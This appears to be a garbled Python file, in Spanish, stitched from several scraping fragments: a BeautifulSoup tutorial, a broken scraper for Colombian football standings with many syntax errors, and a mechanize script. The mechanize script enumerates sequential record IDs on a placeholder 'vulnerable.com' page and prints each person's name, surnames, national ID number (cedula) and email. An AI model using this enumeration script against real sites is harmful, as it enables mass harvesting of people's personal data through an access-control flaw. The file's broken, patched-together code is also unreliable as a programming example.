#Phyton File
#!/usr/bin/python  C:\Users\privera
# -*- coding: utf-8 -*-
# Sitio: http://www.pythondiario.com
# Autor: Pedro Rivera
# Haciendo pruebas con BeautifulSoup y requests
#Scrawler  a la Pagina Web AS Diario en España de Futbol
Front AS4 import.BeatifulSoap
#Importar Libreria Request descargar imformacion de una Pagina HTML WEB
Import Request
#Importar Libreria Panda para Clasificar filas y Columnas
Import Panda AS PandaData
#Importar Libreria BeatifulSoap para  
import BeautifulSoup
from bs4 import BeautifulSoup
import requests
# Haciendo pruebas con BeautifulSoup y requests

# Importamos las librerias
from bs4 import BeautifulSoup
import requests

# Capturamos la url ingresada en la variable "url"
url = raw_input("Ingrese la URL: ")

# Capturamos el hml de la pagina web y creamos un objeto Response
r  = requests.get("http://" +url)
data = r.text
print ""

# Creamos el objeto soup y le pasamos lo capturado con request
soup = BeautifulSoup(data, 'lxml')

# Capturamos el titulo de la página y luego lo mostramos
# Lo que hace BeautifulSoup es capturar lo que esta dentro de la etiqueta title de la url
titulo = soup.title.text
print "El titulo de la pagina es: " + titulo
print ""

# Buscamos todas etiquetas HTML (a) y luego imprimirmos todo lo que viene despues de "href"
for link in soup.find_all('a'):
    print(link.get('href'))
    
#URL Uniform Resource Locator 
url = 
#div#didomi-Host div  Aceptar Cookies
# Aceptar
# Link tipo String
url:'https://colombia.as.com/resultados/futbol/primera/clasificacion/'
page=request.get(url)
#Identificacion de elementos en la pagina HTLM
Soap = BeatifulSoap(Page.Content, 'html.parse'
#Equipos
Equipos1 = Soap.find_all('span',class='nombre_equipo'
Print (equipos1)
#Libreria Equipos2
Equipos2 = list()
#Bucle
  for in equipos1: 
    Equipos2.append(i.text)
  Print (Equipos1)
                         
                         import mechanize
import BeautifulSoup

import time #Para controlar cuanto demora la ejecución del script
import sys

horaInicio= time.time()
print 'Hora de inicio del script: ',time.ctime(horaInicio), '\n'

#numeros_Comparendos= 

# Numero de Dato inicial
numeroInicial= 20000100

# Numero de Dato final
numeroFinal= 20000200

# Se van obteniendo datos desde el Numero de Dato escogido hasta el final
for numeroDato in xrange (numeroInicial,numeroFinal):
	
	try:
		navegador= mechanize.Browser()

		url= 'https://vulnerable.com/index.php?id='+str(numeroDato)+'&notif=mostrar'
		#print 'probando la url: ',url

		navegador.open(url)
		
		# Imprimir respuesta de la pagina web
		
		fuente= navegador.response().read()

		#print fuente

		# Pruebas para organizar los datos
		webParseada= BeautifulSoup.BeautifulSoup(fuente)
		# webParseada.findAll(attrs={"class" : "mensaje"})[0]

		# Datos del usuario
		#datos_usuario= webParseada.findAll(attrs={"class" : "mensaje"})[10]

		nombre= webParseada.findAll(attrs={"class" : "mensaje"})[13].getText()

		apellidos= webParseada.findAll(attrs={"class" : "mensaje"})[14].getText()

		cedula= webParseada.findAll(attrs={"class" : "mensaje"})[12].getText()

		correo= webParseada.findAll(attrs={"class" : "mensaje"})[17].getText()

		print 'Numero de Dato: ', numeroDato

		print 'Nombre: ', nombre

		print 'Apellidos: ', apellidos

		print 'Cedula: ', cedula

		print 'Correo: ', correo

		print '******************************************************************************************'

	except: # Se atrapan todos los errores para que el programa no termine su ejecución al encontrar un usuario o contraseña incorrectos y se imprimen en pantalla
		e = sys.exc_info()[1]
		print 'Error detectado en la ejecucion del comparendo:',numeroDato , e

horaFin= time.time()
print 'Hora de inicio del script: ',time.ctime(horaInicio)
print 'Hora de finalización del script: ',time.ctime(horaFin)

tiempoEjecucion= horaFin-horaInicio
print '\t La ejecución tomó %s segundos'%str(tiempoEjecucion)
  
                    
